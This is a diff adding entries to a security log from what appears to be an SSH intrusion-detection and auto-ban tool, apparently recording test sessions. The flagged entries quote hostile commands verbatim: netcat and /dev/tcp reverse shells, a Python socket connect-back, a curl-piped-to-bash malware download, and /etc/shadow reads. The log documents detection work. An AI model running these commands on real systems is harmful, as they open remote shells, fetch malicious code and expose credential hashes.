@@ -834,3 +834,573 @@ DETAILS  : Ban duration expired for INTERNAL IP 198.51.100.33; automatically unb
   Summary: Network: [INTERNAL] | Target: 198.51.100.19 restriction lifted! Reason: Manual Admin Master Flush
   Details: Network: [INTERNAL] | Target: 198.51.100.19 restriction lifted! Reason: Manual Admin Master Flush
 ---------------------------------------------------------------------------
+[2026-08-19 13:36:41] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.1.185 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.1.185 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.1.185 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-19 13:36:41] [INFO    ] [SAFE OPERATION] [AUTH_GUARD] [HUMAN_TYPO_TOLERATED]
+  Target: 192.168.1.185 | MITRE: N/A | AI Verdict: N/A
+  Summary: Human password typo tolerated for target 192.168.1.185. (Safe Operation - No ban applied).
+  Details: Tolerated human password typo (1/8) for user 'root' from 192.168.1.185. No ban applied.
+---------------------------------------------------------------------------
+[2026-08-19 13:36:56] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.1.185 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.1.185 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.1.185 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-19 13:36:56] [INFO    ] [SAFE OPERATION] [AUTH_GUARD] [HUMAN_TYPO_TOLERATED]
+  Target: 192.168.1.185 | MITRE: N/A | AI Verdict: N/A
+  Summary: Human password typo tolerated for target 192.168.1.185. (Safe Operation - No ban applied).
+  Details: Tolerated human password typo (1/8) for user 'root' from 192.168.1.185. No ban applied.
+---------------------------------------------------------------------------
+[2026-08-19 13:36:56] [INFO    ] [SAFE OPERATION] [AUTH_GUARD] [HUMAN_TYPO_TOLERATED]
+  Target: 192.168.1.185 | MITRE: N/A | AI Verdict: N/A
+  Summary: Human password typo tolerated for target 192.168.1.185. (Safe Operation - No ban applied).
+  Details: Tolerated human password typo (2/8) for user 'root' from 192.168.1.185. No ban applied.
+---------------------------------------------------------------------------
+[2026-08-19 13:36:57] [INFO    ] [SAFE OPERATION] [AUTH_GUARD] [HUMAN_TYPO_TOLERATED]
+  Target: 192.168.1.185 | MITRE: N/A | AI Verdict: N/A
+  Summary: Human password typo tolerated for target 192.168.1.185. (Safe Operation - No ban applied).
+  Details: Tolerated human password typo (3/8) for user 'root' from 192.168.1.185. No ban applied.
+---------------------------------------------------------------------------
+[2026-08-19 13:36:57] [INFO    ] [SAFE OPERATION] [AUTH_GUARD] [HUMAN_TYPO_TOLERATED]
+  Target: 192.168.1.185 | MITRE: N/A | AI Verdict: N/A
+  Summary: Human password typo tolerated for target 192.168.1.185. (Safe Operation - No ban applied).
+  Details: Tolerated human password typo (4/8) for user 'root' from 192.168.1.185. No ban applied.
+---------------------------------------------------------------------------
+[2026-08-19 13:36:58] [INFO    ] [SAFE OPERATION] [AUTH_GUARD] [HUMAN_TYPO_TOLERATED]
+  Target: 192.168.1.185 | MITRE: N/A | AI Verdict: N/A
+  Summary: Human password typo tolerated for target 192.168.1.185. (Safe Operation - No ban applied).
+  Details: Tolerated human password typo (5/8) for user 'root' from 192.168.1.185. No ban applied.
+---------------------------------------------------------------------------
+[2026-08-19 13:36:59] [INFO    ] [SAFE OPERATION] [AUTH_GUARD] [HUMAN_TYPO_TOLERATED]
+  Target: 192.168.1.185 | MITRE: N/A | AI Verdict: N/A
+  Summary: Human password typo tolerated for target 192.168.1.185. (Safe Operation - No ban applied).
+  Details: Tolerated human password typo (6/8) for user 'root' from 192.168.1.185. No ban applied.
+---------------------------------------------------------------------------
+[2026-08-19 13:36:59] [INFO    ] [SAFE OPERATION] [AUTH_GUARD] [HUMAN_TYPO_TOLERATED]
+  Target: 192.168.1.185 | MITRE: N/A | AI Verdict: N/A
+  Summary: Human password typo tolerated for target 192.168.1.185. (Safe Operation - No ban applied).
+  Details: Tolerated human password typo (7/8) for user 'root' from 192.168.1.185. No ban applied.
+---------------------------------------------------------------------------
+[2026-08-19 13:37:00] [INFO    ] [SAFE OPERATION] [AUTH_GUARD] [HUMAN_TYPO_TOLERATED]
+  Target: 192.168.1.185 | MITRE: N/A | AI Verdict: N/A
+  Summary: Human password typo tolerated for target 192.168.1.185. (Safe Operation - No ban applied).
+  Details: Tolerated human password typo (8/8) for user 'root' from 192.168.1.185. No ban applied.
+---------------------------------------------------------------------------
+[2026-08-19 13:37:00] [WARNING ] [SUSPICIOUS / WARNING] [AUTH_GUARD] [TYPO_THRESHOLD_EXCEEDED]
+  Target: 192.168.1.185 | MITRE: N/A | AI Verdict: N/A
+  Summary: Password failure tolerance exceeded (9/8) for user 'root' from 192.168.1.185.
+  Details: Password failure tolerance exceeded (9/8) for user 'root' from 192.168.1.185.
+---------------------------------------------------------------------------
+[2026-08-19 13:37:00] [CRITICAL] [MALICIOUS OPERATION] [BAN_MANAGER] [INTERNAL_IP_BAN]
+  Target: 192.168.1.185 | MITRE: N/A | AI Verdict: N/A
+  Summary: INTERNAL LAN IP 192.168.1.185 SSH isolated due to security violations.
+  Details: Target 192.168.1.185 (INTERNAL) restricted for 5 mins. Reason: SSH Password Retry Limit Exceeded (9/8 Failed Attempts - TYPO_THRESHOLD_EXCEEDED)
+---------------------------------------------------------------------------
+[2026-08-19 13:37:00] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.1.185 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.1.185 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.1.185 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-19 13:37:00] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.1.190 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.1.190 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.1.190 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-19 13:37:00] [NOTICE  ] [SAFE OPERATION] [SESSION_TRACKER] [USER_LOGIN]
+  Target: 192.168.1.190 | MITRE: N/A | AI Verdict: N/A
+  Summary: User 'root' logged in successfully. (IP: 192.168.1.190 | Terminal: pts/0)
+  Details: User 'root' logged in successfully. (IP: 192.168.1.190 | Terminal: pts/0)
+---------------------------------------------------------------------------
+[2026-08-19 13:37:00] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.1.190 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.1.190 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.1.190 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-19 13:42:37] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.1.210 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.1.210 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.1.210 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-19 13:42:37] [NOTICE  ] [SAFE OPERATION] [SESSION_TRACKER] [USER_LOGIN]
+  Target: 192.168.1.210 | MITRE: N/A | AI Verdict: N/A
+  Summary: User 'developer' logged in successfully. (IP: 192.168.1.210 | Terminal: pts/0)
+  Details: User 'developer' logged in successfully. (IP: 192.168.1.210 | Terminal: pts/0)
+---------------------------------------------------------------------------
+[2026-08-19 13:42:37] [NOTICE  ] [SAFE OPERATION] [SESSION_TRACKER] [USER_LOGIN]
+  Target: LOCAL_SYSTEM | MITRE: N/A | AI Verdict: N/A
+  Summary: User 'developer' logged in successfully. (IP: LOCAL_SYSTEM | Terminal: pts/0)
+  Details: User 'developer' logged in successfully. (IP: LOCAL_SYSTEM | Terminal: pts/0)
+---------------------------------------------------------------------------
+[2026-08-19 13:42:37] [CRITICAL] [MALICIOUS ATTACK] [USER_ACTIVITY] [COMMAND_SENSITIVE_FILE_READ]
+  Target: LOCAL_SYSTEM | MITRE: T1068 | AI Verdict: ATTACK
+  Summary: AI [ATTACK] (100.0% Confidence) | Privilege Escalation / Integrity Violation (MITRE T1068 - SYSTEM_INTEGRITY) detected from LOCAL_SYSTEM.
+  Details: Session [SESS_developer_LOCAL_SYSTEM_pts_0_1787136157]: User 'developer' executed 'cat /etc/shadow'. (Summary: Unauthorized Sensitive Credential/Privilege File Read)
+---------------------------------------------------------------------------
+[2026-08-19 13:43:17] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.1.210 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.1.210 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.1.210 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-19 13:43:17] [NOTICE  ] [SAFE OPERATION] [SESSION_TRACKER] [USER_LOGIN]
+  Target: 192.168.1.210 | MITRE: N/A | AI Verdict: N/A
+  Summary: User 'developer' logged in successfully. (IP: 192.168.1.210 | Terminal: pts/0)
+  Details: User 'developer' logged in successfully. (IP: 192.168.1.210 | Terminal: pts/0)
+---------------------------------------------------------------------------
+[2026-08-19 13:43:17] [CRITICAL] [MALICIOUS ATTACK] [USER_ACTIVITY] [COMMAND_SENSITIVE_FILE_READ]
+  Target: LOCAL_SYSTEM | MITRE: T1068 | AI Verdict: ATTACK
+  Summary: AI [ATTACK] (100.0% Confidence) | Privilege Escalation / Integrity Violation (MITRE T1068 - SYSTEM_INTEGRITY) detected from LOCAL_SYSTEM.
+  Details: Session [SESS_developer_192.168.1.210_pts_0_1787136197]: User 'developer' executed 'cat /etc/shadow'. (Summary: Unauthorized Sensitive Credential/Privilege File Read)
+---------------------------------------------------------------------------
+[2026-08-19 13:44:28] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.1.210 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.1.210 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.1.210 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-19 13:44:28] [NOTICE  ] [SAFE OPERATION] [SESSION_TRACKER] [USER_LOGIN]
+  Target: 192.168.1.210 | MITRE: N/A | AI Verdict: N/A
+  Summary: User 'developer' logged in successfully. (IP: 192.168.1.210 | Terminal: pts/0)
+  Details: User 'developer' logged in successfully. (IP: 192.168.1.210 | Terminal: pts/0)
+---------------------------------------------------------------------------
+[2026-08-19 13:44:28] [CRITICAL] [MALICIOUS ATTACK] [USER_ACTIVITY] [COMMAND_SENSITIVE_FILE_READ]
+  Target: 192.168.1.210 | MITRE: T1068 | AI Verdict: ATTACK
+  Summary: AI [ATTACK] (100.0% Confidence) | Privilege Escalation / Integrity Violation (MITRE T1068 - SYSTEM_INTEGRITY) detected from 192.168.1.210.
+  Details: Session [SESS_developer_192.168.1.210_pts_0_1787136268]: User 'developer' executed 'cat /etc/shadow'. (Summary: Unauthorized Sensitive Credential/Privilege File Read)
+---------------------------------------------------------------------------
+[2026-08-19 13:44:28] [CRITICAL] [MALICIOUS OPERATION] [BAN_MANAGER] [INTERNAL_IP_BAN]
+  Target: 192.168.1.210 | MITRE: N/A | AI Verdict: N/A
+  Summary: INTERNAL LAN IP 192.168.1.210 SSH isolated due to security violations.
+  Details: Target 192.168.1.210 (INTERNAL) restricted for 15 mins. Reason: Session Hostile Activity: 'cat /etc/shadow' (CRITICAL Level - Risk: 75)
+---------------------------------------------------------------------------
+[2026-08-19 13:44:28] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.1.210 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.1.210 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.1.210 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-19 13:46:49] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.1.222 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.1.222 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.1.222 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-19 13:46:49] [NOTICE  ] [SAFE OPERATION] [SESSION_TRACKER] [USER_LOGIN]
+  Target: 192.168.1.222 | MITRE: N/A | AI Verdict: N/A
+  Summary: User 'attacker' logged in successfully. (IP: 192.168.1.222 | Terminal: pts/2)
+  Details: User 'attacker' logged in successfully. (IP: 192.168.1.222 | Terminal: pts/2)
+---------------------------------------------------------------------------
+[2026-08-19 13:46:49] [CRITICAL] [MALICIOUS ATTACK] [USER_ACTIVITY] [COMMAND_REVERSE_SHELL_ATTEMPT]
+  Target: 192.168.1.222 | MITRE: T1071 | AI Verdict: ATTACK
+  Summary: AI [ATTACK] (100.0% Confidence) | Command & Control (C2) / Reverse Shell (MITRE T1071 - NETWORK_C2) detected from 192.168.1.222.
+  Details: Session [SESS_attacker_192.168.1.222_pts_2_1787136409]: User 'attacker' executed 'nc -e /bin/bash 198.51.100.200 4444'. (Summary: Outbound Reverse Shell Connection Attempt)
+---------------------------------------------------------------------------
+[2026-08-19 13:46:49] [CRITICAL] [MALICIOUS OPERATION] [BAN_MANAGER] [INTERNAL_IP_BAN]
+  Target: 192.168.1.222 | MITRE: N/A | AI Verdict: N/A
+  Summary: INTERNAL LAN IP 192.168.1.222 SSH isolated due to security violations.
+  Details: Target 192.168.1.222 (INTERNAL) restricted for 15 mins. Reason: Session Hostile Activity: 'nc -e /bin/bash 198.51.100.200 4444' (CRITICAL Level - Risk: 85)
+---------------------------------------------------------------------------
+[2026-08-19 13:46:49] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.1.222 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.1.222 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.1.222 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-19 13:46:49] [NOTICE  ] [SAFE OPERATION] [SESSION_TRACKER] [USER_LOGOUT]
+  Target: 192.168.1.222 | MITRE: N/A | AI Verdict: N/A
+  Summary: User 'attacker' logged out. (IP: 192.168.1.222 | Terminal: pts/2)
+  Details: User 'attacker' logged out. (IP: 192.168.1.222 | Terminal: pts/2)
+---------------------------------------------------------------------------
+[2026-08-19 13:46:49] [NOTICE  ] [SAFE OPERATION] [SESSION_TRACKER] [USER_LOGIN]
+  Target: 192.168.1.222 | MITRE: N/A | AI Verdict: N/A
+  Summary: User 'attacker' logged in successfully. (IP: 192.168.1.222 | Terminal: pts/2)
+  Details: User 'attacker' logged in successfully. (IP: 192.168.1.222 | Terminal: pts/2)
+---------------------------------------------------------------------------
+[2026-08-19 13:46:49] [WARNING ] [MALICIOUS ATTACK] [USER_ACTIVITY] [COMMAND_UNVERIFIED_SCRIPT_PIPE]
+  Target: 192.168.1.222 | MITRE: T1190 | AI Verdict: ATTACK
+  Summary: AI [ATTACK] (98.9% Confidence) | Web Application Attack (SQLi/XSS/XXE/LFI) (MITRE T1190 - APPLICATION_EXPLOIT) detected from 192.168.1.222.
+  Details: Session [SESS_attacker_192.168.1.222_pts_2_1787136409]: User 'attacker' executed 'curl -s http://198.51.100.200/malware.sh | bash'. (Summary: Unverified Remote Web Script Piped Directly into Shell)
+---------------------------------------------------------------------------
+[2026-08-19 13:46:49] [CRITICAL] [MALICIOUS OPERATION] [BAN_MANAGER] [INTERNAL_IP_BAN]
+  Target: 192.168.1.222 | MITRE: N/A | AI Verdict: N/A
+  Summary: INTERNAL LAN IP 192.168.1.222 SSH isolated due to security violations.
+  Details: Target 192.168.1.222 (INTERNAL) restricted for 10 mins. Reason: Session Hostile Activity: 'curl -s http://198.51.100.200/malware.sh | bash' (HIGH Level - Risk: 80)
+---------------------------------------------------------------------------
+[2026-08-19 13:46:49] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.1.222 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.1.222 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.1.222 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-19 13:46:49] [NOTICE  ] [SAFE OPERATION] [SESSION_TRACKER] [USER_LOGOUT]
+  Target: 192.168.1.222 | MITRE: N/A | AI Verdict: N/A
+  Summary: User 'attacker' logged out. (IP: 192.168.1.222 | Terminal: pts/2)
+  Details: User 'attacker' logged out. (IP: 192.168.1.222 | Terminal: pts/2)
+---------------------------------------------------------------------------
+[2026-08-19 13:46:49] [NOTICE  ] [SAFE OPERATION] [SESSION_TRACKER] [USER_LOGIN]
+  Target: 192.168.1.222 | MITRE: N/A | AI Verdict: N/A
+  Summary: User 'attacker' logged in successfully. (IP: 192.168.1.222 | Terminal: pts/2)
+  Details: User 'attacker' logged in successfully. (IP: 192.168.1.222 | Terminal: pts/2)
+---------------------------------------------------------------------------
+[2026-08-19 13:46:49] [WARNING ] [MALICIOUS ATTACK] [USER_ACTIVITY] [COMMAND_INLINE_INTERPRETER_EXEC]
+  Target: 192.168.1.222 | MITRE: T1071 | AI Verdict: ATTACK
+  Summary: AI [ATTACK] (100.0% Confidence) | Command & Control (C2) / Reverse Shell (MITRE T1071 - NETWORK_C2) detected from 192.168.1.222.
+  Details: Session [SESS_attacker_192.168.1.222_pts_2_1787136409]: User 'attacker' executed 'python3 -c 'import socket,os; s=socket.socket(); s.connect(("1.2.3.4",4444))''. (Summary: Inline Command-Line Code String Injection Execution)
+---------------------------------------------------------------------------
+[2026-08-19 13:46:49] [CRITICAL] [MALICIOUS OPERATION] [BAN_MANAGER] [INTERNAL_IP_BAN]
+  Target: 192.168.1.222 | MITRE: N/A | AI Verdict: N/A
+  Summary: INTERNAL LAN IP 192.168.1.222 SSH isolated due to security violations.
+  Details: Target 192.168.1.222 (INTERNAL) restricted for 20 mins. Reason: Session Hostile Activity: 'python3 -c 'import socket,os; s=socket.socket(); s.connect(("1.2.3.4",4444))'' (HIGH Level - Risk: 60)
+---------------------------------------------------------------------------
+[2026-08-19 13:46:49] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.1.222 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.1.222 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.1.222 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-19 13:57:43] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.1.188 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.1.188 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.1.188 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-19 15:46:14] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 198.51.100.77 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 198.51.100.77 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 198.51.100.77 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-19 15:46:14] [CRITICAL] [MALICIOUS OPERATION] [PORT_SCAN_GUARD] [NMAP_PORT_SCAN_INTERCEPT]
+  Target: 198.51.100.77 | MITRE: N/A | AI Verdict: N/A
+  Summary: Automated port sweep scan detected from 198.51.100.77 (5 ports in <3s). 1-Hour kernel ban enforced.
+  Details: Automated port sweep scan detected from 198.51.100.77 (5 ports in <3s). 1-Hour kernel ban enforced.
+---------------------------------------------------------------------------
+[2026-08-19 15:46:14] [CRITICAL] [MALICIOUS OPERATION] [BAN_MANAGER] [INTERNAL_IP_BAN]
+  Target: 198.51.100.77 | MITRE: N/A | AI Verdict: N/A
+  Summary: INTERNAL LAN IP 198.51.100.77 SSH isolated due to security violations.
+  Details: Target 198.51.100.77 (INTERNAL) restricted for 120 mins. Reason: Nmap Port Scan Sweep Detected (5+ distinct ports probed in <3s)
+---------------------------------------------------------------------------
+[2026-08-19 15:46:14] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 198.51.100.77 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 198.51.100.77 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 198.51.100.77 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-19 15:46:14] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.1.240 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.1.240 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.1.240 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-19 15:46:14] [NOTICE  ] [SAFE OPERATION] [SESSION_TRACKER] [USER_LOGIN]
+  Target: 192.168.1.240 | MITRE: N/A | AI Verdict: N/A
+  Summary: User 'guest_user' logged in successfully. (IP: 192.168.1.240 | Terminal: pts/3)
+  Details: User 'guest_user' logged in successfully. (IP: 192.168.1.240 | Terminal: pts/3)
+---------------------------------------------------------------------------
+[2026-08-19 15:46:14] [CRITICAL] [MALICIOUS ATTACK] [USER_ACTIVITY] [COMMAND_REVERSE_SHELL_ATTEMPT]
+  Target: 192.168.1.240 | MITRE: T1071 | AI Verdict: ATTACK
+  Summary: AI [ATTACK] (99.3% Confidence) | Command & Control (C2) / Reverse Shell (MITRE T1071 - NETWORK_C2) detected from 192.168.1.240.
+  Details: Session [SESS_guest_user_192.168.1.240_pts_3_1787143574321]: User 'guest_user' executed 'bash -i >& /dev/tcp/198.51.100.200/4444 0>&1'. (Summary: Outbound Reverse Shell Connection Attempt)
+---------------------------------------------------------------------------
+[2026-08-19 15:46:14] [CRITICAL] [MALICIOUS OPERATION] [BAN_MANAGER] [INTERNAL_IP_BAN]
+  Target: 192.168.1.240 | MITRE: N/A | AI Verdict: N/A
+  Summary: INTERNAL LAN IP 192.168.1.240 SSH isolated due to security violations.
+  Details: Target 192.168.1.240 (INTERNAL) restricted for 15 mins. Reason: Session Hostile Activity: 'bash -i >& /dev/tcp/198.51.100.200/4444 0>&1' (CRITICAL Level - Risk: 85)
+---------------------------------------------------------------------------
+[2026-08-19 15:46:14] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.1.240 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.1.240 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.1.240 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-19 15:46:14] [NOTICE  ] [SAFE OPERATION] [SESSION_TRACKER] [USER_LOGOUT]
+  Target: 192.168.1.240 | MITRE: N/A | AI Verdict: N/A
+  Summary: User 'guest_user' logged out. (IP: 192.168.1.240 | Terminal: pts/3)
+  Details: User 'guest_user' logged out. (IP: 192.168.1.240 | Terminal: pts/3)
+---------------------------------------------------------------------------
+[2026-08-19 15:46:14] [NOTICE  ] [SAFE OPERATION] [SESSION_TRACKER] [USER_LOGIN]
+  Target: 192.168.1.240 | MITRE: N/A | AI Verdict: N/A
+  Summary: User 'guest_user' logged in successfully. (IP: 192.168.1.240 | Terminal: pts/3)
+  Details: User 'guest_user' logged in successfully. (IP: 192.168.1.240 | Terminal: pts/3)
+---------------------------------------------------------------------------
+[2026-08-19 15:46:14] [CRITICAL] [MALICIOUS ATTACK] [USER_ACTIVITY] [COMMAND_SENSITIVE_FILE_READ]
+  Target: 192.168.1.240 | MITRE: T1068 | AI Verdict: ATTACK
+  Summary: AI [ATTACK] (93.4% Confidence) | Privilege Escalation / Integrity Violation (MITRE T1068 - SYSTEM_INTEGRITY) detected from 192.168.1.240.
+  Details: Session [SESS_guest_user_192.168.1.240_pts_3_1787143574596]: User 'guest_user' executed 'head -n 2 /etc/shadow'. (Summary: Unauthorized Sensitive Credential File Read (/etc/shadow))
+---------------------------------------------------------------------------
+[2026-08-19 15:46:14] [CRITICAL] [MALICIOUS OPERATION] [BAN_MANAGER] [INTERNAL_IP_BAN]
+  Target: 192.168.1.240 | MITRE: N/A | AI Verdict: N/A
+  Summary: INTERNAL LAN IP 192.168.1.240 SSH isolated due to security violations.
+  Details: Target 192.168.1.240 (INTERNAL) restricted for 30 mins. Reason: Session Hostile Activity: 'head -n 2 /etc/shadow' (CRITICAL Level - Risk: 75)
+---------------------------------------------------------------------------
+[2026-08-19 15:46:14] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.1.240 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.1.240 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.1.240 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-19 15:48:24] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.1.201 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.1.201 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.1.201 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-19 15:48:24] [NOTICE  ] [SAFE OPERATION] [SESSION_TRACKER] [USER_LOGIN]
+  Target: 192.168.1.201 | MITRE: N/A | AI Verdict: N/A
+  Summary: User 'attacker' logged in successfully. (IP: 192.168.1.201 | Terminal: pts/2)
+  Details: User 'attacker' logged in successfully. (IP: 192.168.1.201 | Terminal: pts/2)
+---------------------------------------------------------------------------
+[2026-08-19 15:48:25] [CRITICAL] [MALICIOUS ATTACK] [USER_ACTIVITY] [COMMAND_REVERSE_SHELL_ATTEMPT]
+  Target: 192.168.1.201 | MITRE: T1071 | AI Verdict: ATTACK
+  Summary: AI [ATTACK] (100.0% Confidence) | Command & Control (C2) / Reverse Shell (MITRE T1071 - NETWORK_C2) detected from 192.168.1.201.
+  Details: Session [SESS_attacker_192.168.1.201_pts_2_1787143704977]: User 'attacker' executed 'nc -e /bin/sh 10.0.0.9 4444'. (Summary: Outbound Reverse Shell Connection Attempt)
+---------------------------------------------------------------------------
+[2026-08-19 15:48:25] [CRITICAL] [MALICIOUS OPERATION] [BAN_MANAGER] [INTERNAL_IP_BAN]
+  Target: 192.168.1.201 | MITRE: N/A | AI Verdict: N/A
+  Summary: INTERNAL LAN IP 192.168.1.201 SSH isolated due to security violations.
+  Details: Target 192.168.1.201 (INTERNAL) restricted for 15 mins. Reason: Session Hostile Activity: 'nc -e /bin/sh 10.0.0.9 4444' (CRITICAL Level - Risk: 85)
+---------------------------------------------------------------------------
+[2026-08-19 15:48:25] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.1.201 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.1.201 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.1.201 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-19 15:48:25] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.1.155 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.1.155 restriction lifted! Reason: Manual Unban
+  Details: Network: [INTERNAL] | Target: 192.168.1.155 restriction lifted! Reason: Manual Unban
+---------------------------------------------------------------------------
+[2026-08-19 15:48:25] [NOTICE  ] [SAFE OPERATION] [SESSION_TRACKER] [USER_LOGIN]
+  Target: 192.168.1.155 | MITRE: N/A | AI Verdict: N/A
+  Summary: User 'ubuntu' logged in successfully. (IP: 192.168.1.155 | Terminal: pts/1)
+  Details: User 'ubuntu' logged in successfully. (IP: 192.168.1.155 | Terminal: pts/1)
+---------------------------------------------------------------------------
+[2026-08-19 15:48:25] [NOTICE  ] [SAFE OPERATION] [SESSION_TRACKER] [USER_LOGIN]
+  Target: 192.168.1.155 | MITRE: N/A | AI Verdict: N/A
+  Summary: User 'root' logged in successfully. (IP: 192.168.1.155 | Terminal: pts/1)
+  Details: User 'root' logged in successfully. (IP: 192.168.1.155 | Terminal: pts/1)
+---------------------------------------------------------------------------
+[2026-08-19 15:48:25] [INFO    ] [SAFE OPERATION] [BAN_MANAGER] [BAN_REMOVED]
+  Target: 192.168.1.177 | MITRE: N/A | AI Verdict: N/A
+  Summary: Network: [INTERNAL] | Target: 192.168.1.177 restriction lifted! Reason: Manual Unban
